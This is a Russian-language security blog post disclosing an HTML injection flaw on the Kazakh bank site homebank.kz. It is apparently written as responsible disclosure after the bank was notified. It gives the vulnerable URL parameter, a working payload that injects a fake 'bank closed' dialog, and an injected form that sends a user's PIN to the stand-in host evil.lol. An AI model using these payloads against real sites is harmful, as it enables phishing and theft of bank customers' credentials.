---
layout: post
title: "Уязвимость в Казком 2 (HTML Injection)"
date: '2015-11-23T07:56:24+06:00'
categories: bank security
about: 'about.html'
---
Сегодня обсудим очередную уязвимость на сайте банка и как ее могут использовать мошенники. О проблеме на домене **homebank.kz** 
я сообщил банку 20 дней назад. Предыдущий пост про Казком [здесь].
<!--more-->

>**HTML Injection** (внедрение кода) - это когда пользователь может вставлять HTML тэги в веб-приложение и изменить вид страницы или добавить новые элементы. 

На главной странице Homebank есть форма для смены пароля.
![image][img0]
  
Сама форма отображается с помощью &lt;iframe&gt;, а ссылка на ресурс выглядит так:
  
>hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?**url**=https://www.homebank.kz/login/join/recard.htm?join-view=1
  
Параметр **url** отображается на странице без соответствующей обработки. Мы можем вставить текст *&lt;h1&gt;* или ссылку *&lt;a&gt;*. 
Пример:
![image][img1]
  
Сайт банка блокирует такие тэги и атрибуты как *script, src, data* и т. д., поэтому мы не можем показывать всплывающее окно с помощью *alert()*. 
Однако, мы можем использовать тэг **&lt;dialog&gt;**,чтобы создать всплывающее окно без javascript (браузерная [поддержка в Казахстане] почти 55%).

Результат такой ссылки

>hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/recard.htm?join-view=1=1″/&gt;&lt;dialog open style=&ldquo;background:red;color:#fff;font-size:1.5em;&rdquo;&gt;Homebank закрыт&lt;br&gt;Позвоните завтра.&lt;br&gt;&lt;br&gt;:(&lt;/dialog&gt;&lt;!&ndash;

![image][img2]

Можно также вставить свою форму, например как:

&lt;form action=**//evil.lol**&gt;&lt;input name=“pin”&gt;&lt;/form&gt;

![image][img3]

Когда пользователь заполнит и отправит форму, мошенникам остается только посмотреть логи сервера на **evil.lol**. Там будет вся необходимая информация. 
Результат после нажатия кнопки SUBMEEET c последней картинки:

![image][img4]

В итоге уязвимы:

- hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/card.htm?join-view=1
- hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/recard.htm?join-view=1

Как мы видим, нельзя недооценивать серьезность вставки кода, особенно на сайте банка. Надеюсь, что данное утверждение на сайте Homebank больше 
не будет ошибочным.

![image][img5]

Будьте бдительнее.

[здесь]: https://caspicasoft.com/blog/2015/10/26/kazkom-html-injection-1
[поддержка в Казахстане]: http://caniuse.com/#feat=dialog
[img0]: /assets/images/{{page.slug}}/img0.png
[img1]: /assets/images/{{page.slug}}/img1.png
[img2]: /assets/images/{{page.slug}}/img2.png
[img3]: /assets/images/{{page.slug}}/img3.png
[img4]: /assets/images/{{page.slug}}/img4.png
[img5]: /assets/images/{{page.slug}}/img5.png